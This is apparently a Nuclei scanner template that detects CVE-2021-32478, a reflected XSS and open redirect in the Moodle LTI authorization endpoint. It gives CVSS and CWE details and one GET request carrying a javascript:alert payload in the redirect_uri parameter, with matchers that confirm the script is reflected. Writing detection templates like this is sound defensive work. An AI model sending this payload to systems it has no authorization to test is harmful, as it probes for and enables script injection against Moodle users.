id: CVE-2021-32478

info:
  name: Moodle 3.8-3.10.3 - Reflected XSS & Open Redirect
  author: hackergautam
  severity: medium
  description: |
    Moodle versions 3.10 to 3.10.3, 3.9 to 3.9.6, 3.8 to 3.8.8 contain a reflected XSS and open redirect caused by insufficient sanitization of the redirect URI in the LTI authorization endpoint, letting attackers execute scripts or redirect users maliciously, exploit requires crafted URL with malicious redirect URI.
  reference:
    - https://twitter.com/JacksonHHax/status/1391367064154042377
    - https://nvd.nist.gov/vuln/detail/CVE-2021-32478
    - https://moodle.org/mod/forum/discuss.php?d=422314
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-32478
    cwe-id: CWE-79
    epss-score: 0.03754
    epss-percentile: 0.87602
    cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: moodle
    product: moodle
  tags: cve,cve2021,moodle,xss,intrusive,vuln,vkev

http:
  - method: GET
    path:
      - "{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert('{{randstr}}')"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{{randstr}}'
          - '<form action="javascript:alert'
        condition: and

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/html"
# digest: 490a00463044022067051d5926332b25f83cecbe30c23cb1061d6a73f88a9c550bc6b57d3420d552022042d7307e9f4921438a14478d55c3bb7ab29aba9c486e83f7f6c99f6f5ce841a9:922c64590222798bb761d5b6d8e72950